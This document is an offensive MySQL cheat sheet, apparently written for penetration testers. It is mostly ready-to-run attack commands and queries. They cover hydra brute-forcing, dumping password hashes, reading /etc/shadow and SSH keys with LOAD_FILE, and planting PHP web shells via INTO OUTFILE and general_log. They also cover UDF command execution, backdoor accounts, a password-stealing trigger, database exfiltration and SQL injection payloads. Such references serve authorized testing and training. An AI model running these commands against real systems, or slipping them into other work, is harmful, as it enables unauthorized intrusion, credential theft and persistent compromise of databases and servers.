# MySQL Enumeration (3306)

## Run nmap MySQL scripts
```bash
nmap --script=mysql-* -p 3306 $IP
```

## Connect to MySQL
```bash
# Anonymous: -u root without -p OR -u root -ppassword for auth
mysql -h $IP -u root
```

## Brute force MySQL with hydra
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mysql
```

## Dump MySQL database with mysqldump
```bash
mysqldump -h $IP -u root -ppassword database_name > dump.sql
```

---

# MySQL Enumeration Methodology

## Initial Reconnaissance

1. Identify MySQL service on port 3306
2. Test for anonymous/guest access (root with no password)
3. Try default credentials
4. If credentials obtained, enumerate databases and tables
5. Look for FILE privilege for file operations
6. Extract sensitive data and credentials

## Authentication Testing

**Anonymous access:**
Try connecting without password:
```bash
mysql -h $IP -u root
mysql -h $IP -u admin
mysql -h $IP -u ''
```

**Common default credentials:**
- root: (blank)
- root:root
- root:admin
- root:password
- admin:admin
- user:user

## Basic Enumeration Queries

**Once connected:**
```sql
SELECT version();               -- MySQL version
SELECT user();                  -- Current user
SELECT database();              -- Current database
SHOW databases;                 -- All databases
SHOW tables;                    -- Tables in current DB
SELECT host, user, password FROM mysql.user;  -- Users and hashes
```

## Database and Table Exploration

**Switch database:**
```sql
USE database_name;
```

**List tables:**
```sql
SHOW tables;
```

**Describe table structure:**
```sql
DESCRIBE table_name;
```

**View table contents:**
```sql
SELECT * FROM table_name;
```

## User and Privilege Enumeration

**Check current privileges:**
```sql
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();
```

**List all users:**
```sql
SELECT user, host, password FROM mysql.user;
```

**Check for FILE privilege:**
```sql
SELECT user, file_priv FROM mysql.user WHERE file_priv='Y';
```

FILE privilege allows reading/writing files on the system.

**Check for admin privileges:**
```sql
SELECT user, super_priv FROM mysql.user WHERE super_priv='Y';
```

## File Operations

**Reading files (requires FILE privilege):**
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Writing files (requires FILE privilege and writable location):**
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**Note:** secure_file_priv setting may restrict file operations:
```sql
SHOW variables LIKE 'secure_file_priv';
```

If empty, files can be written anywhere. If set to a directory, only that directory is allowed.

## Web Shell Creation

**PHP web shell:**
```sql
SELECT '<?php echo system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**Test web shell:**
```bash
curl http://$IP/shell.php?cmd=whoami
```

**Requirements:**
- FILE privilege
- Web server running
- Write access to web directory
- secure_file_priv allows it

## Database Content Analysis

**Search for password tables:**
```sql
SHOW tables LIKE '%pass%';
SHOW tables LIKE '%user%';
SHOW tables LIKE '%admin%';
```

**Search for sensitive columns:**
```sql
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%email%';
```

**Extract credentials:**
```sql
SELECT username, password FROM users;
SELECT email, password FROM accounts;
```

## Configuration Analysis

**Check MySQL configuration:**
```sql
SHOW variables;
SHOW variables LIKE 'secure_file_priv';
SHOW variables LIKE 'version%';
```

**Dangerous settings to look for:**
- secure_file_priv = '' (empty, allows file ops anywhere)
- general_log enabled with writable location
- Weak authentication requirements

## Log File Manipulation

**Enable general log:**
```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
```

**Execute query to write to log:**
```sql
SELECT '<?php system($_GET["cmd"]); ?>';
```

**Disable logging:**
```sql
SET GLOBAL general_log = 'OFF';
```

**Result:**
Log file at /var/www/html/shell.php contains PHP code and can be executed as web shell.

## UDF (User Defined Function) Exploitation

**What is UDF:**
Custom functions loaded from shared libraries. If you can upload a malicious .so file, you can execute OS commands.

**Check for existing UDFs:**
```sql
SELECT * FROM mysql.func;
```

**Creating UDF for command execution:**
Requires:
- Root privileges
- Ability to write .so file to MySQL plugin directory
- FILE privilege

**Advanced technique:** Use Metasploit's mysql_udf_payload or manual UDF creation.

## Privilege Escalation

**If MySQL runs as root:**
```sql
SELECT user();  -- Check user
\! whoami       -- Execute shell command
```

If MySQL process runs as root, file operations have elevated privileges.

**Extract root's SSH key:**
```sql
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

## Persistence

**Create backdoor user:**
```sql
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;
```

**Create trigger for persistence:**
```sql
CREATE TRIGGER backdoor_trigger BEFORE INSERT ON users
FOR EACH ROW INSERT INTO backdoor_table VALUES (NEW.username, NEW.password);
```

## Data Exfiltration

**Export entire database:**
```bash
mysqldump -h $IP -u root -ppassword database_name > dump.sql
```

**Export specific table:**
```bash
mysqldump -h $IP -u root -ppassword database_name table_name > table_dump.sql
```

**Export to CSV:**
```sql
SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

## SQL Injection (If Web App Uses MySQL)

**Test in web applications:**
```
' OR 1=1--
" OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
```

**Extract data:**
```
' UNION SELECT username,password FROM users--
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
```

## Brute Force Considerations

**When to brute force:**
- Only as last resort
- With targeted wordlists
- When lockout policy is known

**Tools:**
- hydra: Reliable, supports MySQL
- nmap mysql-brute script

**Be aware:** MySQL brute force is slow and generates logs.

## Enumeration Checklist

- [ ] Anonymous access testing
- [ ] Default credentials testing
- [ ] User and privilege enumeration
- [ ] Database and table discovery
- [ ] FILE privilege capability testing
- [ ] Web shell creation (if web server present)
- [ ] Sensitive data extraction
- [ ] Configuration analysis
- [ ] Hash extraction attempts
- [ ] UDF exploitation potential

## Common Misconfigurations

1. **Default root password** (blank or weak)
2. **FILE privilege** granted to non-admin users
3. **secure_file_priv set to empty** (allows file ops anywhere)
4. **MySQL running as root** user
5. **General log enabled** with writable location
6. **Weak user passwords**
7. **ALL PRIVILEGES** granted to non-admin users
8. **Remote root login** allowed

## Common MySQL Ports

- 3306/tcp: MySQL default
- 3307/tcp: MySQL alternate

## Next Steps

Once MySQL access is gained:
1. Extract sensitive data from databases
2. Attempt file operations for web shell creation
3. Check for password reuse across other services
4. Analyze application code if database credentials found
5. Escalate privileges if MySQL runs as root
6. Create persistence via backdoor users

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
- https://www.exploit-db.com/exploits/1518 (MySQL UDF)
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
